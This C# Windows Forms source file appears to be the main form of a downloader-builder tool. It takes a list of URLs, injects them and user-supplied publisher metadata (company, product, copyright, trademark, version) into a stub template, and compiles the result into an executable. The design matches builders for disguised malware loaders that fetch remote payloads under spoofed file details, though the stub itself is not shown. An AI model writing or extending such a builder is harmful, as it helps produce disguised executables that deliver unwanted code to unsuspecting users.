using System;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace Downloader
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            AddLink _Add_Link = new AddLink();

            _Add_Link.ShowDialog();

            if (_Add_Link.DialogResult == DialogResult.OK)
            {
                ListViewItem _List_View_Item = new ListViewItem();

                string _Status = !Data._URL_List.Contains(Data._URL) ? "Valid" : "Invalid";

                _List_View_Item.Text = Data._URL;
                _List_View_Item.SubItems.Add(_Status);

                listView1.Items.Insert(0, _List_View_Item);
                listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                listView1.AutoResizeColumn(1, ColumnHeaderAutoResizeStyle.ColumnContent);

                if (_Status.Equals("Valid"))
                {
                    _List_View_Item.ForeColor = Color.Green;

                    Data._URL_List.Add(Data._URL);
                }
                else
                {
                    _List_View_Item.ForeColor = Color.Red;
                }
            }
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem _URL in listView1.SelectedItems)
                {
                    Data._URL_List.Remove(_URL.Text);

                    _URL.Remove();
                }
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog _Save_File_Dialog = new SaveFileDialog())
            {
                _Save_File_Dialog.Filter = "Executable (*.exe)|*.exe";
                _Save_File_Dialog.ShowDialog();

                var _Stub = Properties.Resources.Stub
                    .Replace("\"#URL#\"", string.Join(", ", Data._URL_List.Select(x => $"\"{x}\"").ToList()))
                    .Replace("#Title#", textBox1.Text)
                    .Replace("#Description#", textBox2.Text)
                    .Replace("#Company#", textBox3.Text)
                    .Replace("#Product#", textBox4.Text)
                    .Replace("#Copyright#", textBox5.Text)
                    .Replace("#Trademark#", textBox6.Text)
                    .Replace("#v1#", numericUpDown1.Text)
                    .Replace("#v2#", numericUpDown2.Text)
                    .Replace("#v3#", numericUpDown3.Text)
                    .Replace("#v4#", numericUpDown4.Text);

                new Compiler().Build(_Stub, _Save_File_Dialog.FileName);

                MessageBox.Show("Done!");
            }
        }
    }
}